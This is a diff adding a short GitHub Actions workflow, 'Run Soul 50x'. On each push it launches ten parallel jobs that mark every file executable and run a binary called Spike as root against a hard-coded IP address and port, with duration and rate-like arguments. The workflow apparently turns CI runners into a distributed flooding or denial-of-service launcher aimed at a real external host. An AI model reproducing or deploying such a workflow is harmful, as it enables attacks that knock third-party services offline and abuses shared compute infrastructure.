@@ -1,0 +1,12 @@
+name: Run Soul 50x
+on: [push]
+jobs:
+  soul:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x *
+      - run: sudo ./Spike 20.235.51.86 26101 240 900 1500
